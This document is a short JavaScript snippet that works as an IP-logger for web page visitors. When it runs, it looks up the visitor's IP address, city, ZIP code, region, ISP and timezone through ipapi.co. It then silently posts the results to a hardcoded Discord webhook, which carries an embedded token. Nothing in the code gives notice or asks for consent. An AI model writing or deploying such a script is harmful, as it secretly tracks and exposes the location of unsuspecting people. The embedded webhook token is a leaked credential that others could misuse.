const webhook = "https://discord.com/api/webhooks/1474073969790292130/KXnQaqXw1WPzQ4Q_ZpwU2AxUbmqO7rBk9keeMaV5pLxwcczq9OzaYeezS0BdtPKrJyM8"

async function IP_Info(){
    let response = await fetch("https://ipapi.co/json/", {
      method: 'GET',
      headers: {
        "cache-control" : "no-cache",
        "content-type": "application/json"
      }
    })
    return response.json()
}

IP_Info().then((value)=> {

    let requiredInfo = [
      "ip","country_name","city","postal","region"
    ]

    let noData = false

    for(let i = 0; i < requiredInfo.length; i++){
      if(typeof(value[requiredInfo[i]]) === 'undefined'){
        noData = true
        break
      } 
    }

    if(noData){
      return null
    }

    return value

}).then(async (value) => {

    if(value !== null){

       await fetch(webhook, {
        method: 'POST',
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          content:"``New Visitor``",
          embeds: [{
              title: "Visitor IP Information",
              type:"rich",
              color: 12223968,
              description: "```IP information of the recent website visitor.```",
              fields: [{
                name: "IP", value: `${value.ip}`, inline: false
              },
              {
                name: "Country", value: `${value.country_name}`, inline: false
              },
              {
                name: "City", value: `${value.city}`, inline: false
              },
              {
                name: "ZIP", value: `${value.postal}`, inline: false
              },
              {
                name: "Region", value: `${value.region}`, inline: false
              },
              {
                name: "ISP", value: `${value.org}`, inline: false
              },
              {
                name: "Timezone", value: `${value.timezone}`, inline: false
              }
              ]
          }]
        })
      }).catch((err)=>{
        console.log(err)
      })
    }

}).catch((err)=> {
    console.log(err)
})